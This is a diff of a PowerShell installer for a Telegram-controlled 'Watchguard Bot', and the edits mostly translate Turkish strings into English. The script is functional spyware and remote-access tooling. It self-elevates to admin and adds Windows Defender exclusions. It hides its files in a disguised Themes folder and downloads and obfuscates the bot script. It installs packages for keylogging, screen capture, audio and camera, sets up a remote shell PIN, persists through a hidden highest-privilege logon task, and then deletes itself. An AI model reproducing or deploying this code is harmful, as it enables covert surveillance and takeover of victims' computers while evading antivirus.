@@ -1,24 +1,18 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Watchguard Bot v3.0 - Yonetim Araci
+    Watchguard Bot v3.0 - Management Tool
 .DESCRIPTION
-    Kurulum, kaldirma ve proses yonetimi icin TUI menu.
+    TUI menu for installation, removal, and process management.
 #>
 
-# ── UTF-8 konsol ─────────────────────────────────────────────────────────────
-$null = cmd /c "chcp 65001"
-[Console]::InputEncoding  = [System.Text.Encoding]::UTF8
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$OutputEncoding            = [System.Text.Encoding]::UTF8
-
-# ── Admin yetkisi (kendini yukseltiyor) ──────────────────────────────────────
+# ── Admin elevation (self-elevates via UAC) ──────────────────────────────────
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
            ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     Write-Host ""
-    Write-Host "  [!] Admin yetkisi gerekiyor - UAC penceresi acilacak..." -ForegroundColor Yellow
+    Write-Host "  [!] Administrator rights required - UAC prompt will appear..." -ForegroundColor Yellow
     Write-Host ""
     Start-Process powershell -Verb RunAs -ArgumentList `
         "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
@@ -26,14 +20,14 @@ if (-not $isAdmin) {
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-# YARDIMCI FONKSİYONLAR
+# HELPER FUNCTIONS
 # ══════════════════════════════════════════════════════════════════════════════
 
 function Write-Banner {
     Clear-Host
     Write-Host ""
     Write-Host "  ============================================================" -ForegroundColor Cyan
-    Write-Host "       Watchguard Bot v3.0  --  Yonetim Araci               " -ForegroundColor Cyan
+    Write-Host "       Watchguard Bot v3.0  --  Management Tool             " -ForegroundColor Cyan
     Write-Host "  ============================================================" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -52,7 +46,7 @@ function Write-OK    { param([string]$T); Write-Host "  [+] $T" -ForegroundColor
 function Write-Err   { param([string]$T); Write-Host "  [!] $T" -ForegroundColor Red    }
 function Write-Info  { param([string]$T); Write-Host "      $T" -ForegroundColor Gray   }
 
-# ── Ortak degiskenler ─────────────────────────────────────────────────────────
+# ── Shared variables ──────────────────────────────────────────────────────────
 $watchguardDir = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
 $datPath       = Join-Path $watchguardDir "watchguard.dat"
 $scriptDest    = Join-Path $watchguardDir "watchguard_v3.pyw"
@@ -60,7 +54,7 @@ $scriptUrl     = "https://raw.githubusercontent.com/zygomatic-git/watchguard/mai
 $taskName      = "WatchguardBot"
 
 # ══════════════════════════════════════════════════════════════════════════════
-# PYTHON BUL
+# FIND PYTHON
 # ══════════════════════════════════════════════════════════════════════════════
 
 function Find-Python {
@@ -107,104 +101,105 @@ function Find-Python {
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-# EYLEM 1: KUR / YENİDEN KUR
+# ACTION 1: INSTALL / REINSTALL
 # ══════════════════════════════════════════════════════════════════════════════
 
 function Invoke-Install {
     Write-Banner
-    Write-Header "KUR / YENIDEN KUR"
+    Write-Header "INSTALL / REINSTALL"
 
-    # Mevcut kurulum varsa uyar
+    # Warn if existing installation detected
     if (Test-Path $datPath) {
-        Write-Host "  [!] Mevcut kurulum tespit edildi." -ForegroundColor Yellow
-        $confirm = Read-Host "  Uzerine yazmak istiyor musunuz? (E/H)"
-        if ($confirm -notmatch '^[Ee]') {
-            Write-Info "Iptal edildi."
+        Write-Host "  [!] Existing installation detected." -ForegroundColor Yellow
+        $confirm = Read-Host "  Overwrite? (Y/N)"
+        if ($confirm -notmatch '^[Yy]') {
+            Write-Info "Cancelled."
             return
         }
         Invoke-KillProcesses -Silent
     }
 
-    # ── ADIM 1: Bot bilgileri ─────────────────────────────────────────────────
-    Write-Header "ADIM 1/7 - Bot Bilgileri"
+    # ── STEP 1: Bot credentials ───────────────────────────────────────────────
+    Write-Header "STEP 1/7 - Bot Credentials"
 
     $token = ""
     while ($token -eq "") {
-        $token = (Read-Host "  Bot Token (BotFather'dan alinan)").Trim()
-        if ($token -eq "") { Write-Err "Bot Token bos olamaz." }
+        $token = (Read-Host "  Bot Token (from BotFather)").Trim()
+        if ($token -eq "") { Write-Err "Bot Token cannot be empty." }
     }
-    Write-OK "Bot Token alindi"
+    Write-OK "Bot Token received"
 
     $ownerId = ""
     while ($ownerId -eq "") {
-        $raw = (Read-Host "  Owner ID (Telegram kullanici ID'niz)").Trim()
-        if ($raw -match '^\d+$') { $ownerId = $raw }
-        else { Write-Err "Owner ID sadece rakam icermeli. Ornek: 210965041" }
+        $raw = (Read-Host "  Owner ID (your Telegram user ID)").Trim()
+        if ($raw -match '^\d+$') { $ownerId = $raw } else {
+            Write-Err "Owner ID must be digits only. Example: 210965041"
+        }
     }
-    Write-OK "Owner ID alindi: $ownerId"
+    Write-OK "Owner ID received: $ownerId"
 
-    $pinRaw = (Read-Host "  Shell PIN (opsiyonel - sadece rakam, bos = PIN yok)").Trim()
+    $pinRaw = (Read-Host "  Shell PIN (optional - digits only, leave blank = no PIN)").Trim()
     if ($pinRaw -match '^\d+$') {
         $pin = $pinRaw
-        Write-OK "Shell PIN alindi"
+        Write-OK "Shell PIN received"
     } else {
         $pin = "null"
-        Write-Info "Shell PIN atlatildi"
+        Write-Info "Shell PIN skipped"
     }
 
-    # ── ADIM 2: Defender istisna ──────────────────────────────────────────────
-    Write-Header "ADIM 2/7 - Antivirus Istisnasi"
+    # ── STEP 2: Defender exclusion ────────────────────────────────────────────
+    Write-Header "STEP 2/7 - Antivirus Exclusion"
 
-    Write-Step "Windows Defender istisna ekleniyor..."
-    Write-Info "Konum: $watchguardDir"
+    Write-Step "Adding Windows Defender exclusion..."
+    Write-Info "Path: $watchguardDir"
     try {
         Add-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
-        Write-OK "Defender istisna eklendi"
+        Write-OK "Defender exclusion added"
     } catch {
-        Write-Err "Defender istisna eklenemedi (ucuncu taraf AV olabilir)"
-        Write-Info "Antivirüs programinizdan su klasoru istisna ekleyin:"
+        Write-Err "Could not add Defender exclusion (third-party AV may be active)"
+        Write-Info "Please add the following folder as an exclusion in your antivirus:"
         Write-Info "  $watchguardDir"
         Write-Host ""
-        Read-Host "  Istisnayi ekledikten sonra Enter'a basin"
+        Read-Host "  Press Enter after adding the exclusion"
     }
 
-    # ── ADIM 3: Python ────────────────────────────────────────────────────────
-    Write-Header "ADIM 3/7 - Python"
+    # ── STEP 3: Python ────────────────────────────────────────────────────────
+    Write-Header "STEP 3/7 - Python"
 
-    Write-Step "Python aranıyor..."
+    Write-Step "Searching for Python..."
     $pyInfo = Find-Python
 
     if ($pyInfo) {
         $pythonExe  = $pyInfo.python
         $pythonwExe = $pyInfo.pythonw
-        Write-OK "Python bulundu: $($pyInfo.version)"
+        Write-OK "Python found: $($pyInfo.version)"
         Write-Info "python.exe  : $pythonExe"
         Write-Info "pythonw.exe : $pythonwExe"
     } else {
-        Write-Step "Python bulunamadi - yuklemeye calisiliyor..."
+        Write-Step "Python not found - attempting installation..."
         $wingetOk = $false
         try {
             $wg = Get-Command winget -ErrorAction SilentlyContinue
             if ($wg) {
-                Write-Info "winget ile Python 3.12 yukleniyor..."
+                Write-Info "Installing Python 3.12 via winget..."
                 & winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
-                if ($LASTEXITCODE -eq 0) { $wingetOk = $true; Write-OK "winget kurulumu tamamlandi" }
+                if ($LASTEXITCODE -eq 0) { $wingetOk = $true; Write-OK "winget installation complete" }
             }
         } catch {}
 
         if (-not $wingetOk) {
-            Write-Info "winget basarisiz - python.org'dan indiriliyor..."
+            Write-Info "winget failed - downloading from python.org..."
             $installerUrl  = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
             $installerPath = Join-Path $env:TEMP "python_installer.exe"
             try {
                 Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
                 Start-Process -FilePath $installerPath `
                     -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=1" -Wait
-                Write-OK "Python kurulumu tamamlandi"
+                Write-OK "Python installation complete"
             } catch {
-                Write-Err "Python indirilemedi/kurulamadi: $_"
-                Write-Info "Lutfen https://python.org adresinden Python 3.10+ yukleyin."
-                Read-Host "  Cikis icin Enter'a basin"
+                Write-Err "Failed to download/install Python: $_"
+                Write-Info "Please install Python 3.10+ from https://python.org"
+                Read-Host "  Press Enter to exit"
                 return
             }
         }
@@ -213,23 +208,23 @@ function Invoke-Install {
         if ($pyInfo) {
             $pythonExe  = $pyInfo.python
             $pythonwExe = $pyInfo.pythonw
-            Write-OK "Python hazir: $($pyInfo.version)"
+            Write-OK "Python ready: $($pyInfo.version)"
         } else {
-            Write-Err "Python hala bulunamadi. PATH'i guncelleyip tekrar deneyin."
-            Read-Host "  Cikis icin Enter'a basin"
+            Write-Err "Python still not found. Update PATH and try again."
+            Read-Host "  Press Enter to exit"
             return
         }
     }
 
     if (-not $pythonwExe -or -not (Test-Path $pythonwExe)) {
-        Write-Info "pythonw.exe bulunamadi - python.exe kullanilacak"
+        Write-Info "pythonw.exe not found - using python.exe"
         $pythonwExe = $pythonExe
     }
 
-    # ── ADIM 4: watchguard.dat ────────────────────────────────────────────────
-    Write-Header "ADIM 4/7 - Yapilandirma Dosyasi"
+    # ── STEP 4: watchguard.dat ────────────────────────────────────────────────
+    Write-Header "STEP 4/7 - Configuration File"
 
-    Write-Step "watchguard.dat olusturuluyor..."
+    Write-Step "Creating watchguard.dat..."
     New-Item -ItemType Directory -Force -Path $watchguardDir | Out-Null
 
     $pyDat = @"
@@ -249,34 +244,36 @@ print('OK:' + dat_path)
     $pyDat | Out-File -FilePath $tmpDat -Encoding UTF8 -NoNewline
     try {
         $result = & $pythonExe $tmpDat $token $ownerId $pin 2>&1
-        if ($result -like "OK:*") { Write-OK "watchguard.dat olusturuldu" }
-        else { Write-Err "watchguard.dat olusturulamadi: $result"; return }
-    } catch { Write-Err "Hata: $_"; return }
+        if ($result -like "OK:*") { Write-OK "watchguard.dat created" } else {
+            Write-Err "Failed to create watchguard.dat: $result"
+            return
+        }
+    } catch { Write-Err "Error: $_"; return }
     finally  { Remove-Item $tmpDat -Force -ErrorAction SilentlyContinue }
 
-    # ── ADIM 5: Script indir + obfüske et ────────────────────────────────────
-    Write-Header "ADIM 5/7 - Bot Scripti"
+    # ── STEP 5: Download + obfuscate script ───────────────────────────────────
+    Write-Header "STEP 5/7 - Bot Script"
 
-    $tempScript = [System.IO.Path]::GetTempFileName() + '.pyw'
+    $tempScript  = [System.IO.Path]::GetTempFileName() + '.pyw'
     $localScript = Join-Path $PSScriptRoot "watchguard_v3.pyw"
 
     if (Test-Path $localScript) {
-        Write-Step "Yerel watchguard_v3.pyw kullaniliyor..."
+        Write-Step "Using local watchguard_v3.pyw..."
         Copy-Item $localScript $tempScript -Force
-        Write-OK "Kaynak hazir (yerel)"
+        Write-OK "Source ready (local)"
     } else {
-        Write-Step "watchguard_v3.pyw GitHub'tan indiriliyor..."
+        Write-Step "Downloading watchguard_v3.pyw from GitHub..."
         try {
             Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScript -UseBasicParsing
-            Write-OK "Script indirildi"
+            Write-OK "Script downloaded"
         } catch {
-            Write-Err "Indirme hatasi: $_"
-            Read-Host "  Cikis icin Enter'a basin"
+            Write-Err "Download error: $_"
+            Read-Host "  Press Enter to exit"
             return
         }
     }
 
-    Write-Step "Obfuskasyon uygulanıyor..."
+    Write-Step "Applying obfuscation..."
     $pyObf = @"
 import zlib, base64, sys
 src = sys.argv[1]; dst = sys.argv[2]
@@ -290,15 +287,17 @@ print('OK')
     $pyObf | Out-File -FilePath $tmpObf -Encoding UTF8 -NoNewline
     try {
         $r = & $pythonExe $tmpObf $tempScript $scriptDest 2>&1
-        if ($r -like "OK*") { Write-OK "Script obfüske edildi: $scriptDest" }
-        else { Write-Err "Obfuskasyon hatasi: $r"; return }
-    } catch { Write-Err "Hata: $_"; return }
+        if ($r -like "OK*") { Write-OK "Script obfuscated: $scriptDest" } else {
+            Write-Err "Obfuscation error: $r"
+            return
+        }
+    } catch { Write-Err "Error: $_"; return }
     finally  { Remove-Item $tmpObf, $tempScript -Force -ErrorAction SilentlyContinue }
 
-    # ── ADIM 6: Python paketleri ──────────────────────────────────────────────
-    Write-Header "ADIM 6/7 - Python Paketleri"
+    # ── STEP 6: Python packages ───────────────────────────────────────────────
+    Write-Header "STEP 6/7 - Python Packages"
 
-    Write-Step "pip guncelleniyor..."
+    Write-Step "Upgrading pip..."
     & $pythonExe -m pip install --upgrade pip --quiet 2>&1 | Out-Null
 
     $packages = @(
@@ -306,96 +305,98 @@ print('OK')
         "opencv-python","numpy","pynput","screeninfo",
         "mss","sounddevice","soundfile","dxcam"
     )
-    Write-Step "Bagimliliklar yukleniyor ($($packages.Count) paket)..."
+    Write-Step "Installing dependencies ($($packages.Count) packages)..."
     & $pythonExe -m pip install @packages --quiet 2>&1 | Out-Null
-    if ($LASTEXITCODE -eq 0) { Write-OK "Tum paketler yuklendi" }
-    else { Write-Err "Bazi paketler yuklenemedi — bot yine de calisabilir" }
+    if ($LASTEXITCODE -eq 0) { Write-OK "All packages installed" } else {
+        Write-Err "Some packages failed - bot may still work"
+    }
 
-    # ── ADIM 7: Task Scheduler ────────────────────────────────────────────────
-    Write-Header "ADIM 7/7 - Task Scheduler"
+    # ── STEP 7: Task Scheduler ────────────────────────────────────────────────
+    Write-Header "STEP 7/7 - Task Scheduler"
 
-    Write-Step "Gorev olusturuluyor..."
+    Write-Step "Creating scheduled task..."
     cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
     $r = cmd /c "schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN $taskName /TR `"`"$pythonwExe`" `"$scriptDest`"`" /RU $env:USERNAME" 2>&1
-    if ($LASTEXITCODE -eq 0) { Write-OK "Task Scheduler gorevi olusturuldu: $taskName" }
-    else {
-        Write-Err "Task Scheduler gorevi olusturulamadi"
-        Write-Info "Manuel eklemek icin: Program=$pythonwExe  Arguman=`"$scriptDest`""
+    if ($LASTEXITCODE -eq 0) { Write-OK "Scheduled task created: $taskName" } else {
+        Write-Err "Failed to create scheduled task"
+        Write-Info "To add manually: Program=$pythonwExe  Argument=`"$scriptDest`""
     }
 
-    # ── Botu baslatmak istiyor mu? ────────────────────────────────────────────
+    # ── Start bot now? ────────────────────────────────────────────────────────
     Write-Host ""
-    $startNow = Read-Host "  Botu simdi baslatmak ister misiniz? (E/H)"
-    if ($startNow -match '^[Ee]') {
+    $startNow = Read-Host "  Start the bot now? (Y/N)"
+    if ($startNow -match '^[Yy]') {
         Start-Process -FilePath $pythonwExe -ArgumentList "`"$scriptDest`"" -WindowStyle Hidden
-        Write-OK "Bot baslatildi — Telegram'dan bildirim bekleniyor..."
+        Write-OK "Bot started - waiting for Telegram notification..."
     } else {
-        Write-Info "Bot bir sonraki oturum acilisinda otomatik baslar."
+        Write-Info "Bot will start automatically on next login."
     }
 
-    # ── Ozet ──────────────────────────────────────────────────────────────────
-    Write-Header "KURULUM TAMAMLANDI"
-    Write-Host "  Bot scripti  : $scriptDest"   -ForegroundColor Gray
+    # ── Summary ───────────────────────────────────────────────────────────────
+    Write-Header "INSTALLATION COMPLETE"
+    Write-Host "  Bot script   : $scriptDest"   -ForegroundColor Gray
     Write-Host "  Config       : $datPath"       -ForegroundColor Gray
     Write-Host "  Task         : $taskName"      -ForegroundColor Gray
     Write-Host ""
-    Write-Host "  Watchguard Bot hazir!" -ForegroundColor Green
+    Write-Host "  Watchguard Bot is ready!" -ForegroundColor Green
     Write-Host ""
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-# EYLEM 2: KALDIR
+# ACTION 2: UNINSTALL
 # ══════════════════════════════════════════════════════════════════════════════
 
 function Invoke-Uninstall {
     Write-Banner
-    Write-Header "KALDIR"
+    Write-Header "UNINSTALL"
 
-    Write-Host "  [!] Asagidakiler silinecek:" -ForegroundColor Yellow
-    Write-Host "      - Tum pythonw.exe prosesleri" -ForegroundColor Gray
-    Write-Host "      - Task Scheduler gorevi: $taskName" -ForegroundColor Gray
+    Write-Host "  [!] The following will be removed:" -ForegroundColor Yellow
+    Write-Host "      - All pythonw.exe processes" -ForegroundColor Gray
+    Write-Host "      - Scheduled task: $taskName" -ForegroundColor Gray
     Write-Host "      - $watchguardDir" -ForegroundColor Gray
-    Write-Host "      - Windows Defender istisna" -ForegroundColor Gray
+    Write-Host "      - Windows Defender exclusion" -ForegroundColor Gray
     Write-Host ""
-    $confirm = Read-Host "  Emin misiniz? (E/H)"
-    if ($confirm -notmatch '^[Ee]') {
-        Write-Info "Iptal edildi."
+    $confirm = Read-Host "  Are you sure? (Y/N)"
+    if ($confirm -notmatch '^[Yy]') {
+        Write-Info "Cancelled."
         return
     }
 
-    Write-Step "Prosesler durduruluyor..."
+    Write-Step "Stopping processes..."
     $killed = Invoke-KillProcesses -Silent
-    if ($killed) { Write-OK "Prosesler durduruldu" }
-    else         { Write-Info "Calisan proses bulunamadi" }
-
-    Write-Step "Task Scheduler gorevi siliniyor..."
-    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
-    if ($LASTEXITCODE -eq 0) { Write-OK "Gorev silindi" }
-    else                     { Write-Info "Gorev zaten yoktu" }
-
-    Write-Step "Dosyalar siliniyor..."
-    if (Test-Path $watchguardDir) {
-        Remove-Item $watchguardDir -Recurse -Force -ErrorAction SilentlyContinue
-        Write-OK "Klasor silindi: $watchguardDir"
-    } else {
-        Write-Info "Klasor zaten yoktu"
+    if ($killed) { Write-OK "Processes stopped" } else {
+        Write-Info "No running processes found"
     }
 
-    Write-Step "Defender istisna kaldiriliyor..."
+    Write-Step "Removing scheduled task..."
+    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
+    if ($LASTEXITCODE -eq 0) { Write-OK "Task removed" } else {
+        Write-Info "Task did not exist"
+    }
+
+    Write-Step "Removing files..."
+    if (Test-Path $watchguardDir) {
+        Remove-Item $watchguardDir -Recurse -Force -ErrorAction SilentlyContinue
+        Write-OK "Folder removed: $watchguardDir"
+    } else {
+        Write-Info "Folder did not exist"
+    }
+
+    Write-Step "Removing Defender exclusion..."
     try {
         Remove-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
-        Write-OK "Defender istisna kaldirildi"
+        Write-OK "Defender exclusion removed"
     } catch {
-        Write-Info "Defender istisna kaldirilamadi (veya zaten yoktu)"
+        Write-Info "Could not remove Defender exclusion (or it did not exist)"
     }
 
     Write-Host ""
-    Write-OK "Watchguard Bot tamamen kaldirildi."
+    Write-OK "Watchguard Bot completely removed."
     Write-Host ""
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-# EYLEM 3: PROSESLERİ DURDUR
+# ACTION 3: STOP PROCESSES
 # ══════════════════════════════════════════════════════════════════════════════
 
 function Invoke-KillProcesses {
@@ -405,7 +406,7 @@ function Invoke-KillProcesses {
     if (-not $procs) {
         if (-not $Silent) {
             Write-Host ""
-            Write-Info "Calisan pythonw.exe prosesi bulunamadi."
+            Write-Info "No running pythonw.exe process found."
             Write-Host ""
         }
         return $false
@@ -413,59 +414,60 @@ function Invoke-KillProcesses {
 
     if (-not $Silent) {
         Write-Host ""
-        Write-Host "  Bulunan prosesler:" -ForegroundColor Yellow
-        $procs | ForEach-Object { Write-Host "    PID $($_.Id)  Bellek: $([math]::Round($_.WorkingSet64/1MB,1)) MB" -ForegroundColor Gray }
+        Write-Host "  Found processes:" -ForegroundColor Yellow
+        $procs | ForEach-Object { Write-Host "    PID $($_.Id)  Memory: $([math]::Round($_.WorkingSet64/1MB,1)) MB" -ForegroundColor Gray }
         Write-Host ""
     }
 
     $procs | Stop-Process -Force -ErrorAction SilentlyContinue
 
     if (-not $Silent) {
-        Write-OK "$($procs.Count) proses durduruldu."
+        Write-OK "$($procs.Count) process(es) stopped."
         Write-Host ""
     }
     return $true
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ANA MENU
+# MAIN MENU
 # ══════════════════════════════════════════════════════════════════════════════
 
 while ($true) {
     Write-Banner
 
-    # Kurulum durumunu goster
+    # Show installation status
     if (Test-Path $datPath) {
-        Write-Host "  Durum : " -NoNewline -ForegroundColor Gray
-        Write-Host "Kurulu " -NoNewline -ForegroundColor Green
+        Write-Host "  Status : " -NoNewline -ForegroundColor Gray
+        Write-Host "Installed " -NoNewline -ForegroundColor Green
         $running = (Get-Process -Name "pythonw" -ErrorAction SilentlyContinue).Count
-        if ($running -gt 0) { Write-Host "| Calisiyor ($running proses)" -ForegroundColor Green }
-        else                 { Write-Host "| Durdu" -ForegroundColor Yellow }
+        if ($running -gt 0) { Write-Host "| Running ($running process)" -ForegroundColor Green } else {
+            Write-Host "| Stopped" -ForegroundColor Yellow
+        }
     } else {
-        Write-Host "  Durum : " -NoNewline -ForegroundColor Gray
-        Write-Host "Kurulu degil" -ForegroundColor Red
+        Write-Host "  Status : " -NoNewline -ForegroundColor Gray
+        Write-Host "Not installed" -ForegroundColor Red
     }
 
     Write-Host ""
     Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "  [1]  Kur / Yeniden Kur" -ForegroundColor White
-    Write-Host "  [2]  Kaldir (Uninstall)" -ForegroundColor White
-    Write-Host "  [3]  Calisanlari Durdur" -ForegroundColor White
-    Write-Host "  [4]  Cikis" -ForegroundColor White
+    Write-Host "  [1]  Install / Reinstall" -ForegroundColor White
+    Write-Host "  [2]  Uninstall" -ForegroundColor White
+    Write-Host "  [3]  Stop Running Processes" -ForegroundColor White
+    Write-Host "  [4]  Exit" -ForegroundColor White
     Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host ""
 
-    $choice = Read-Host "  Seciminiz"
+    $choice = Read-Host "  Choice"
 
     switch ($choice.Trim()) {
-        "1" { Invoke-Install;         Read-Host "  Ana menuye donmek icin Enter'a basin" }
-        "2" { Invoke-Uninstall;       Read-Host "  Ana menuye donmek icin Enter'a basin" }
-        "3" { Invoke-KillProcesses;   Read-Host "  Ana menuye donmek icin Enter'a basin" }
+        "1" { Invoke-Install;         Read-Host "  Press Enter to return to menu" }
+        "2" { Invoke-Uninstall;       Read-Host "  Press Enter to return to menu" }
+        "3" { Invoke-KillProcesses;   Read-Host "  Press Enter to return to menu" }
         "4" {
-            # Kendini sil ve cik
+            # Self-delete and exit
             Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
             exit
         }
-        default { Write-Host "  Gecersiz secim." -ForegroundColor Red; Start-Sleep 1 }
+        default { Write-Host "  Invalid choice." -ForegroundColor Red; Start-Sleep 1 }
     }
 }
